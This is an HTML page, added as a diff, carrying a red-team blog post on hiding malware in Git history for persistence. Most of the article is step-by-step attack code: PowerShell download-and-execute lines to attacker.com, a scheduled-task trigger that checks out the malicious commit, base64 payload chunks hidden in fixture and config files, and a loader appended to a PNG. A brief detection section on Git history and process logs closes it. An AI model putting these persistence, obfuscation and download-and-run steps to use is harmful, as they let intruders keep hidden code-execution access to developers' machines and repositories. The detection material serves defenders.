@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Using Git Commits as a Persistence Mechanism | Chicken0248</title>
+    <link rel="icon" href="/chicken0248.png" type="image/png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-fadeIn { animation: fadeIn 0.5s ease-out; }
+        .dark.min-h-screen { background: linear-gradient(135deg, #0f172a 0%, #141f35 50%, #0a1628 100%) !important; }
+        .dark nav { background-color: rgba(15,23,42,0.96) !important; border-bottom-color: rgba(51,65,85,0.5) !important; }
+        .dark .bg-white    { background-color: #1e293b !important; }
+        .dark .bg-gray-50  { background-color: #0f172a !important; }
+        .dark .bg-gray-100 { background-color: #334155 !important; }
+        .dark .bg-gray-900 { background-color: #0f172a !important; }
+        .dark .bg-blue-50    { background-color: rgba(37,99,235,0.12) !important; }
+        .dark .bg-green-50   { background-color: rgba(22,163,74,0.10) !important; }
+        .dark .bg-yellow-50  { background-color: rgba(202,138,4,0.10) !important; }
+        .dark .bg-orange-100 { background-color: rgba(234,88,12,0.20) !important; }
+        .dark .bg-indigo-50  { background-color: rgba(99,102,241,0.10) !important; }
+        .dark .text-gray-800 { color: #e2e8f0 !important; }
+        .dark .text-gray-700 { color: #cbd5e1 !important; }
+        .dark .text-gray-600 { color: #94a3b8 !important; }
+        .dark .text-gray-500 { color: #64748b !important; }
+        .dark .text-gray-400 { color: #475569 !important; }
+        .dark .text-red-600    { color: #f87171 !important; }
+        .dark .text-blue-600   { color: #60a5fa !important; }
+        .dark .text-green-600  { color: #4ade80 !important; }
+        .dark .text-indigo-600 { color: #818cf8 !important; }
+        .dark .border-gray-100 { border-color: #334155 !important; }
+        .dark .border-gray-200 { border-color: #475569 !important; }
+        .dark .divide-gray-100 > * + * { border-color: #334155 !important; }
+        .dark .hover\:bg-gray-50:hover { background-color: #1e293b !important; }
+        .dark .hover\:text-blue-600:hover { color: #60a5fa !important; }
+        .dark pre { background-color: #0f172a !important; }
+        .dark code { color: #e2e8f0 !important; }
+        .dark table thead { background-color: #1e293b !important; }
+        .dark table thead th { color: #e2e8f0 !important; border-color: #475569 !important; }
+        .dark table td { border-color: #334155 !important; }
+        .dark ::-webkit-scrollbar { width: 6px; }
+        .dark ::-webkit-scrollbar-track { background: #0f172a; }
+        .dark ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+    <script type="text/babel">
+        const { useState, useEffect, useRef } = React;
+
+        const Icon = ({ name, className = "w-6 h-6", ...props }) => {
+            const ref = useRef(null);
+            useEffect(() => {
+                if (ref.current) {
+                    const el = lucide.createElement(lucide[name], { class: className });
+                    ref.current.innerHTML = '';
+                    ref.current.appendChild(el);
+                }
+            }, [name, className]);
+            return <i ref={ref} className={`flex-shrink-0 ${className}`} {...props}></i>;
+        };
+
+        const IMG = '/assets/research/git-commits-persistence';
+
+        const Section = ({ id, title, icon, children }) => (
+            <section id={id} className="scroll-mt-24">
+                <h2 className="text-2xl font-bold text-gray-800 mb-5 flex items-center gap-3 border-b border-gray-200 pb-3">
+                    <Icon name={icon} className="w-6 h-6 text-indigo-600" />
+                    {title}
+                </h2>
+                <div className="space-y-4">{children}</div>
+            </section>
+        );
+
+        const SubSection = ({ title, children }) => (
+            <div className="space-y-3">
+                <h3 className="text-xl font-semibold text-gray-800">{title}</h3>
+                {children}
+            </div>
+        );
+
+        const CodeBlock = ({ language, children }) => (
+            <div className="rounded-xl border border-gray-200 overflow-hidden my-4">
+                <div className="bg-gray-800 text-gray-400 text-xs px-4 py-2 font-mono">{language}</div>
+                <pre className="bg-gray-900 text-gray-100 p-4 overflow-x-auto text-sm font-mono leading-relaxed"><code>{children}</code></pre>
+            </div>
+        );
+
+        const Img = ({ src, alt, caption }) => (
+            <figure className="my-4">
+                <img src={`${IMG}/${src}`} alt={alt || ''} className="rounded-xl border border-gray-200 shadow-sm w-full" loading="lazy" />
+                {caption && <figcaption className="text-center text-sm text-gray-500 mt-2 italic">{caption}</figcaption>}
+            </figure>
+        );
+
+        const Callout = ({ type = "info", children }) => {
+            const styles = { info: "bg-blue-50 border-blue-200 text-blue-800", warning: "bg-yellow-50 border-yellow-200 text-yellow-800", tip: "bg-green-50 border-green-200 text-green-800" };
+            const icons = { info: "Info", warning: "AlertTriangle", tip: "Lightbulb" };
+            return (
+                <div className={`rounded-xl border p-4 flex gap-3 my-4 ${styles[type]}`}>
+                    <Icon name={icons[type]} className="w-5 h-5 flex-shrink-0 mt-0.5" />
+                    <div className="space-y-1 text-sm leading-relaxed">{children}</div>
+                </div>
+            );
+        };
+
+        const B = ({ children }) => <strong className="text-gray-800">{children}</strong>;
+        const C = ({ children }) => <code className="bg-gray-100 text-red-600 px-1.5 py-0.5 rounded text-sm font-mono">{children}</code>;
+
+        const App = () => {
+            const [dark, setDark] = useState(() => localStorage.getItem('darkMode') === 'true');
+            useEffect(() => { localStorage.setItem('darkMode', dark); }, [dark]);
+
+            const tocItems = [
+                { id: 'introduction', label: 'Introduction', icon: 'BookOpen' },
+                { id: 'how-it-works', label: 'How This Attack Works', icon: 'Cpu' },
+                { id: 'technical-background', label: 'Technical Background', icon: 'GitBranch' },
+                { id: 'poc', label: 'Proof of Concept', icon: 'FlaskConical' },
+                { id: 'hiding-multi-file', label: 'Hiding in Multiple Files', icon: 'Files' },
+                { id: 'steganography', label: 'Hiding via Steganography', icon: 'Image' },
+                { id: 'detection', label: 'Detection Opportunities', icon: 'ShieldCheck' },
+                { id: 'conclusion', label: 'Conclusion', icon: 'CheckCircle' },
+            ];
+
+            return (
+                <div className={`min-h-screen bg-gradient-to-br from-slate-50 via-purple-50 to-indigo-50 ${dark ? 'dark' : ''}`}>
+                    <nav className="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-gray-200 px-4 py-3">
+                        <div className="max-w-4xl mx-auto flex items-center justify-between">
+                            <div className="flex items-center gap-2 text-sm flex-wrap">
+                                <a href="/" className="flex items-center gap-2 hover:opacity-80 transition-opacity">
+                                    <img src="/chicken0248.png" alt="Logo" className="w-7 h-7 rounded-lg" />
+                                    <span className="font-bold text-gray-800 hidden sm:inline">Chicken0248</span>
+                                </a>
+                                <span className="text-gray-400">/</span>
+                                <a href="/research/index.html" className="font-medium text-gray-600 hover:text-blue-600 transition-colors">Research</a>
+                                <span className="text-gray-400">/</span>
+                                <span className="font-semibold text-gray-700">Git Persistence</span>
+                            </div>
+                            <button onClick={() => setDark(!dark)} className="p-2 rounded-lg hover:bg-gray-100 text-gray-600 transition-colors text-lg">
+                                {dark ? '\u2600\uFE0F' : '\uD83C\uDF19'}
+                            </button>
+                        </div>
+                    </nav>
+
+                    <main className="max-w-4xl mx-auto px-4 py-8 space-y-10 animate-fadeIn">
+
+                        {/* Hero */}
+                        <div className="relative overflow-hidden rounded-3xl shadow-2xl">
+                            <img src={`${IMG}/cover.png`} alt="Git Commits as Persistence Mechanism" className="w-full h-48 sm:h-64 md:h-80 object-cover" />
+                            <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-black/30 to-transparent" />
+                            <div className="absolute bottom-0 left-0 right-0 p-6 md:p-8 text-white">
+                                <h1 className="text-2xl md:text-4xl font-extrabold tracking-tight mb-3">Using Git Commits as a Persistence Mechanism</h1>
+                                <div className="flex flex-wrap gap-3 text-sm">
+                                    <span className="bg-white/20 backdrop-blur-sm px-3 py-1 rounded-full flex items-center gap-1.5">
+                                        <Icon name="Calendar" className="w-3.5 h-3.5" /> January 8, 2026
+                                    </span>
+                                    <span className="bg-purple-500/80 backdrop-blur-sm px-3 py-1 rounded-full flex items-center gap-1.5">
+                                        <Icon name="Tag" className="w-3.5 h-3.5" /> Red Teaming
+                                    </span>
+                                    <span className="bg-white/20 backdrop-blur-sm px-3 py-1 rounded-full flex items-center gap-1.5">
+                                        <Icon name="GitBranch" className="w-3.5 h-3.5" /> Persistence
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+
+                        {/* Metadata */}
+                        <div className="bg-white rounded-2xl border border-gray-200 p-5 shadow-sm">
+                            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
+                                <div><span className="text-gray-500 block">Author</span><span className="font-semibold text-gray-800">Warawut Manosong (Chicken0248)</span></div>
+                                <div><span className="text-gray-500 block">Published</span><span className="font-semibold text-gray-800">January 8, 2026</span></div>
+                                <div><span className="text-gray-500 block">Originally on</span><a href="https://medium.com/@chaoskist/using-git-commits-as-a-persistence-mechanism-c44a0ee22068" target="_blank" rel="noopener noreferrer" className="font-semibold text-blue-600 hover:underline">Medium ↗</a></div>
+                                <div><span className="text-gray-500 block">Category</span><span className="font-semibold text-indigo-600">Red Teaming</span></div>
+                            </div>
+                        </div>
+
+                        <Callout type="warning">
+                            <p><B>Disclaimer:</B> This research is intended for educational purposes and authorized security testing only. All examples demonstrate behavior in isolated lab environments. Unauthorized testing against systems you don't own is illegal.</p>
+                        </Callout>
+
+                        {/* TOC */}
+                        <div className="bg-white rounded-2xl border border-gray-200 p-6 shadow-sm">
+                            <h2 className="text-lg font-bold text-gray-800 mb-4 flex items-center gap-2">
+                                <Icon name="List" className="w-5 h-5 text-indigo-600" />
+                                Table of Contents
+                            </h2>
+                            <div className="grid sm:grid-cols-2 gap-2">
+                                {tocItems.map((item, i) => (
+                                    <a key={item.id} href={`#${item.id}`}
+                                       className="flex items-center gap-2 px-3 py-2 rounded-lg text-gray-700 hover:bg-gray-50 hover:text-blue-600 transition-colors text-sm">
+                                        <Icon name={item.icon} className="w-4 h-4 text-gray-400" />
+                                        <span className="text-gray-400 font-mono text-xs w-5">{i + 1}.</span>
+                                        <span className="font-medium">{item.label}</span>
+                                    </a>
+                                ))}
+                            </div>
+                        </div>
+
+                        {/* ═══════════ INTRODUCTION ═══════════ */}
+                        <Section id="introduction" title="Introduction" icon="BookOpen">
+                            <p className="text-gray-700 leading-relaxed">
+                                This article explores how <B>Git can be abused as a persistence mechanism</B>. The goal is to understand how attackers could weaponize version control workflows to hide malicious changes, revert states, or automate re-deployment of backdoored code — and how defenders can detect such activity.
+                            </p>
+                            <p className="text-gray-700 leading-relaxed">
+                                This idea randomly appeared while about to sleep, but the more I looked into it, the more fascinating it became. Let's explore how this experiment went and how you could develop more stealthy techniques from it.
+                            </p>
+                            <Img src="img-01.png" alt="Git persistence concept overview" caption="Overview: Using Git history to hide malicious payloads" />
+                        </Section>
+
+                        {/* ═══════════ HOW IT WORKS ═══════════ */}
+                        <Section id="how-it-works" title="How This Attack Works" icon="Cpu">
+                            <SubSection title="The Basic Idea">
+                                <p className="text-gray-700 leading-relaxed">
+                                    Here's the scenario: an attacker gains write access to a Git repository (through compromised credentials, a supply chain attack, or an insider threat). Then they can:
+                                </p>
+                                <ol className="list-decimal list-outside ml-5 space-y-2 text-gray-700">
+                                    <li>Commit malicious code to the repo</li>
+                                    <li>Delete that malicious code in the next commit (looks clean now)</li>
+                                    <li>Use Git commands to jump back to the malicious commit whenever they want</li>
+                                    <li>Execute whatever's there, then jump back to the clean commit</li>
+                                </ol>
+                                <p className="text-gray-700 leading-relaxed">
+                                    This makes everything look normal to developers who don't regularly check commit history — they won't be aware of the malicious commit at all.
+                                </p>
+                            </SubSection>
+
+                            <SubSection title="Why This is Nasty">
+                                <ul className="list-disc list-outside ml-5 space-y-2 text-gray-700">
+                                    <li>Your malicious payload lives in git history but <B>not in the actual current files</B></li>
+                                    <li>Antivirus and file scans won't catch it because it's not "there" right now</li>
+                                    <li>CI/CD pipelines might execute the code during automated checkouts</li>
+                                    <li>It's all using normal git features, so it looks like legitimate activity</li>
+                                </ul>
+                            </SubSection>
+                        </Section>
+
+                        {/* ═══════════ TECHNICAL BACKGROUND ═══════════ */}
+                        <Section id="technical-background" title="Technical Background" icon="GitBranch">
+                            <SubSection title="How Git Actually Works">
+                                <p className="text-gray-700 leading-relaxed">
+                                    Git stores the complete history of all commits for versioning. Even when you delete files and commit that deletion, the files don't actually disappear from git — they're just removed from the current version you're looking at. But git still keeps them in history, and you can go back anytime to grab them.
+                                </p>
+                                <p className="text-gray-700 leading-relaxed">
+                                    You can access old commits (and deleted files) through:
+                                </p>
+                                <ul className="list-disc list-outside ml-5 space-y-1 text-gray-700">
+                                    <li>Commit hashes — <C>git checkout &lt;hash&gt;</C></li>
+                                    <li>Going back X commits — <C>git checkout HEAD~2</C></li>
+                                    <li>Branch names — <C>git checkout feature-branch</C></li>
+                                </ul>
+                                <Callout type="tip">
+                                    <p>Git never really "deletes" anything — it just hides it from your current view. This is great for developers but also perfect for hiding malicious payloads.</p>
+                                </Callout>
+                            </SubSection>
+
+                            <SubSection title="Commands We'll Use">
+                                <CodeBlock language="bash">
+{`# See all your commits
+git log --oneline
+
+# Jump to a specific old commit
+git checkout <commit-hash>
+
+# Go back to where you were before
+git checkout -`}
+                                </CodeBlock>
+                                <Img src="img-02.jpg" alt="High-level attack diagram" caption="High-level diagram: commit, delete, trigger persistence" />
+                                <Img src="img-03.png" alt="Sequence diagram" caption="Sequence diagram of the attack flow" />
+                            </SubSection>
+                        </Section>
+
+                        {/* ═══════════ POC ═══════════ */}
+                        <Section id="poc" title="Proof of Concept" icon="FlaskConical">
+                            <SubSection title="Setting Things Up">
+                                <CodeBlock language="bash">
+{`# Make a new repository
+mkdir git_persistence_poc
+cd git_persistence_poc
+git init
+
+# Set up your git identity
+git config --global user.email "you@example.com"
+git config --global user.name "Your Name"`}
+                                </CodeBlock>
+                            </SubSection>
+
+                            <SubSection title="Step 1 — Create Legitimate Files">
+                                <CodeBlock language="bash">
+{`# Create some normal files
+echo "# Project Documentation" > README.md
+echo "print('Hello World')" > app.py
+
+# Commit them
+git add .
+git commit -m "Initial commit with project files"`}
+                                </CodeBlock>
+                            </SubSection>
+
+                            <SubSection title="Step 2 — Add the Malicious File (Hidden in Noise)">
+                                <p className="text-gray-700 leading-relaxed">
+                                    The stealthy approach: slip the malicious payload in a pile of legitimate-looking files. When someone reviews a 30-file commit, they see package updates, new test files, config changes — and they won't carefully review every single file.
+                                </p>
+                                <CodeBlock language="bash">
+{`# Create legitimate-looking files
+echo '{"dependencies": {"express": "^4.18.0"}}' > package.json
+echo 'node_modules/' > .gitignore
+mkdir tests
+echo 'import unittest' > tests/test_app.py
+
+# Slip in the malicious file among all these changes
+echo 'powershell -ep bypass -c "iwr http://attacker.com/payload.exe -o C:\\users\\public\\p.exe;Start-Process C:\\users\\public\\p.exe"' > scripts/postinstall.ps1
+
+# Commit everything together
+git add .
+git commit -m "Add project dependencies, update configs, add test suite"`}
+                                </CodeBlock>
+                            </SubSection>
+
+                            <SubSection title="Step 3 — Delete It and Look Clean">
+                                <CodeBlock language="bash">
+{`# Remove the malicious file along with other cleanup (looks intentional)
+git rm -r tests/ scripts/ config.yaml
+git commit -m "Clean up old test files and unused scripts"
+
+# The repo now looks totally clean, but the payload still exists in git history`}
+                                </CodeBlock>
+                            </SubSection>
+
+                            <SubSection title="Step 4 — Find the Malicious Commit Hash">
+                                <CodeBlock language="bash">
+{`# Check commit history
+git log --oneline
+
+# List all files in that commit
+git show --name-only <commit_hash>`}
+                                </CodeBlock>
+                            </SubSection>
+
+                            <SubSection title="Step 5 — Trigger the Persistence">
+                                <p className="text-gray-700 leading-relaxed">
+                                    Create a trigger script that jumps to the malicious commit, runs it, then jumps back to the clean commit. This script can be triggered via scheduled tasks, login scripts, WMI event subscriptions, services, or registry Run keys.
+                                </p>
+                                <CodeBlock language="batch">
+{`@echo off
+cd C:\\path\\to\\git_persistence_poc
+
+REM Jump to the malicious commit
+git checkout <commit_hash>
+
+REM Run the payload
+powershell -ep bypass -File scripts\\postinstall.ps1
+
+REM Jump back to previous commit
+git checkout -`}
+                                </CodeBlock>
+                                <Img src="img-04.png" alt="PoC in action - scheduled task trigger" caption="Scheduled task triggering the Git persistence mechanism" />
+                            </SubSection>
+                        </Section>
+
+                        {/* ═══════════ HIDING MULTI-FILE ═══════════ */}
+                        <Section id="hiding-multi-file" title="Hiding Payload into Multiple Files" icon="Files">
+                            <p className="text-gray-700 leading-relaxed">
+                                For remote repositories (GitHub, GitLab, Codeberg), every commit is permanently visible and easy to audit. A more evasive approach: <B>split your payload into multiple encoded chunks</B> and hide them across several files. Each piece looks harmless individually.
+                            </p>
+
+                            <SubSection title="Approach 1: In-Repository Reconstruction Script">
+                                <p className="text-gray-700 leading-relaxed">
+                                    Commit both the encoded payload fragments <B>and</B> a helper script that locates, decodes, merges, and executes them. Easy to automate, but the reconstruction logic is visible to code reviewers.
+                                </p>
+                            </SubSection>
+
+                            <SubSection title="Approach 2: External Reconstruction Script (Stealthier)">
+                                <p className="text-gray-700 leading-relaxed">
+                                    Only put the encoded payload chunks in git commits. The reconstruction script lives on the target machine you already control. Other developers see random data — no "merge and run" script in the repository.
+                                </p>
+                                <Img src="img-05.jpg" alt="External reconstruction script diagram" caption="Approach 2: Payload chunks in repo, reconstruction script on target machine" />
+                                <CodeBlock language="powershell">
+{`# Split and encode payload
+$payload = 'IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'
+$chunk1 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload.Substring(0, 25)))
+$chunk2 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload.Substring(25, 25)))
+$chunk3 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload.Substring(50)))`}
+                                </CodeBlock>
+                                <p className="text-gray-700 leading-relaxed">
+                                    Hide each chunk in different "test files" committed to the repo:
+                                </p>
+                                <CodeBlock language="json">
+{`// tests/fixtures/test_data_1.json
+{
+  "test_case": "edge_case_1",
+  "expected": "success",
+  "metadata": "<base64-chunk-1>"
+}
+
+// config/build_settings.yaml
+version: 2.1
+build:
+  cache_key: "<base64-chunk-3>"
+  timeout: 300`}
+                                </CodeBlock>
+                                <p className="text-gray-700 leading-relaxed">
+                                    The reconstruction script (lives on the compromised machine, <B>not in git</B>):
+                                </p>
+                                <CodeBlock language="powershell">
+{`# C:\\ProgramData\\SystemUpdater\\updater.ps1
+cd C:\\path\\to\\git_persistence_poc
+
+# Extract chunks from git
+$chunk1 = (git show HEAD:tests/fixtures/test_data_1.json | ConvertFrom-Json).metadata
+$chunk2 = (git show HEAD:tests/fixtures/test_data_2.json | ConvertFrom-Json).metadata
+$chunk3 = (git show HEAD:config/build_settings.yaml | Select-String "cache_key").Line.Split('"')[1]
+
+# Decode and reconstruct
+$decoded1 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($chunk1))
+$decoded2 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($chunk2))
+$decoded3 = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($chunk3))
+$fullPayload = $decoded1 + $decoded2 + $decoded3
+
+# Execute
+IEX $fullPayload`}
+                                </CodeBlock>
+                            </SubSection>
+                        </Section>
+
+                        {/* ═══════════ STEGANOGRAPHY ═══════════ */}
+                        <Section id="steganography" title="Hiding Payload in an Image File (Steganography)" icon="Image">
+                            <p className="text-gray-700 leading-relaxed">
+                                There's a rising surge of threat actors hiding base64-encoded loaders within images. With this method, you don't need to delete anything to create a "clean" stage — but your steganography technique must render the image properly to attract less attention.
+                            </p>
+                            <p className="text-gray-700 leading-relaxed">
+                                Embedding into a PNG works well since appending data at the end won't affect how the file renders:
+                            </p>
+                            <CodeBlock language="powershell">
+{`$payload = 'IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'
+$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($payload))
+
+$image = "banner.png"
+$embedded = "<PAYLOAD_START>" + $encoded + "<PAYLOAD_END>"
+
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($embedded)
+$stream = [System.IO.File]::Open($image, 'Append')
+$stream.Write($bytes, 0, $bytes.Length)
+$stream.Close()`}
+                            </CodeBlock>
+                            <p className="text-gray-700 leading-relaxed">
+                                Extraction and execution command:
+                            </p>
+                            <CodeBlock language="powershell">
+{`$t=[Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes('banner.png'))
+$s='<PAYLOAD_START>';$e='<PAYLOAD_END>'
+$p=($t.Substring($t.IndexOf($s)+$s.Length,$t.IndexOf($e)-($t.IndexOf($s)+$s.Length)))
+powershell -enc ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
+    ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))))))`}
+                            </CodeBlock>
+                            <Img src="img-06.png" alt="Steganography payload extraction in action" caption="Payload embedded in PNG extracted and executed" />
+                        </Section>
+
+                        {/* ═══════════ DETECTION ═══════════ */}
+                        <Section id="detection" title="Detection Opportunities" icon="ShieldCheck">
+                            <SubSection title="1. Looking Through Git History">
+                                <p className="text-gray-700 leading-relaxed">
+                                    Hunt for suspicious patterns — files that were added then quickly deleted:
+                                </p>
+                                <CodeBlock language="bash">
+{`# Find files that were deleted
+git log --diff-filter=D --summary
+
+# Look at the whole commit timeline
+git log --all --oneline --graph
+
+# Search for commits that added and removed files in short timeframe
+git log --all --pretty=format:"%h %an %ar - %s" --stat | grep -B5 -A5 "delete"`}
+                                </CodeBlock>
+                            </SubSection>
+
+                            <SubSection title="2. Process Monitoring">
+                                <p className="text-gray-700 leading-relaxed">
+                                    Look for <C>git checkout</C> usage in <B>Sysmon Event ID 1</B> or <B>Security Event ID 4688</B> (with command-line logging enabled). Pay attention to:
+                                </p>
+                                <ul className="list-disc list-outside ml-5 space-y-1 text-gray-700">
+                                    <li>Git checkout commands followed immediately by PowerShell/bash execution</li>
+                                    <li>Git checkout to specific <B>commit hashes</B> (not branches)</li>
+                                    <li>Git checkout commands running from scheduled tasks or startup scripts</li>
+                                    <li>PowerShell with <C>IEX</C> (Invoke-Expression) or <C>IWR</C> (Invoke-WebRequest)</li>
+                                </ul>
+                            </SubSection>
+
+                            <SubSection title="3. Network Activity">
+                                <p className="text-gray-700 leading-relaxed">
+                                    Running <C>git</C> commands other than <C>git push</C> or <C>git pull</C> should <B>not connect to any GitHub domain</B> — all git commit history is stored locally in the <C>.git</C> folder. Unexpected network connections during git operations are a strong indicator of abuse.
+                                </p>
+                            </SubSection>
+                        </Section>
+
+                        {/* ═══════════ CONCLUSION ═══════════ */}
+                        <Section id="conclusion" title="Conclusion" icon="CheckCircle">
+                            <p className="text-gray-700 leading-relaxed">
+                                Git, even though it's just a tool for versioning, can be weaponized for persistence when you don't have proper security controls. This technique is particularly nasty because:
+                            </p>
+                            <ul className="list-disc list-outside ml-5 space-y-2 text-gray-700">
+                                <li>It's using <B>legitimate git features</B></li>
+                                <li>The malicious code is hiding in plain sight (in the commit history)</li>
+                                <li>Most antivirus and EDR won't look inside git objects</li>
+                                <li>It can <B>survive reimaging</B> — just clone the repo again</li>
+                            </ul>
+
+                            <div className="grid sm:grid-cols-2 gap-4 mt-4">
+                                <div className="bg-white rounded-xl border border-gray-200 p-4 shadow-sm">
+                                    <h4 className="font-semibold text-gray-800 mb-2 flex items-center gap-2">
+                                        <Icon name="Sword" className="w-4 h-4 text-red-600" />
+                                        Red Team Takeaway
+                                    </h4>
+                                    <p className="text-gray-600 text-sm">This could be another technique for authorized pentests to keep access through code repositories. Combine with other persistence methods for redundancy.</p>
+                                </div>
+                                <div className="bg-white rounded-xl border border-gray-200 p-4 shadow-sm">
+                                    <h4 className="font-semibold text-gray-800 mb-2 flex items-center gap-2">
+                                        <Icon name="Shield" className="w-4 h-4 text-blue-600" />
+                                        Blue Team Takeaway
+                                    </h4>
+                                    <p className="text-gray-600 text-sm">Don't just scan current files. Git history is another hiding spot for malicious code. Scan repositories comprehensively and monitor git operations.</p>
+                                </div>
+                            </div>
+
+                            <SubSection title="Things to Explore Further">
+                                <ul className="list-disc list-outside ml-5 space-y-1 text-gray-700">
+                                    <li>Using <B>git hooks</B> to automatically execute on certain events</li>
+                                    <li>Hiding payloads in git submodules (external repos)</li>
+                                    <li>Exploiting CI/CD pipelines that checkout arbitrary commits</li>
+                                    <li>Steganography tricks within git objects</li>
+                                    <li>Abusing Git LFS to store large payloads</li>
+                                </ul>
+                            </SubSection>
+                        </Section>
+
+                        {/* Footer Nav */}
+                        <div className="border-t border-gray-200 pt-6 flex items-center justify-between text-sm">
+                            <a href="#" className="flex items-center gap-1.5 text-gray-500 hover:text-indigo-600 transition-colors">
+                                <Icon name="ArrowUp" className="w-4 h-4" />
+                                Back to top
+                            </a>
+                            <a href="/research/index.html" className="flex items-center gap-1.5 text-gray-500 hover:text-indigo-600 transition-colors">
+                                <Icon name="ArrowLeft" className="w-4 h-4" />
+                                All Research
+                            </a>
+                        </div>
+                    </main>
+                </div>
+            );
+        };
+
+        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+    </script>
+</body>
+</html>
